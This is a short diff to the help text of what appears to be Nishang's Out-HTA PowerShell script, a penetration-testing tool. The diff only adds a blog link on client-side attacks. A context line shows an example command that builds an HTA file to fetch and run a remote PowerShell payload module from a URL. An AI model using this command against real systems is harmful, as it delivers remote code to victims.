@@ -44,6 +44,7 @@ PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-
 Use above command to pass an argument to the powershell script/module.
 
 .LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
 https://github.com/samratashok/nishang
 #>
 
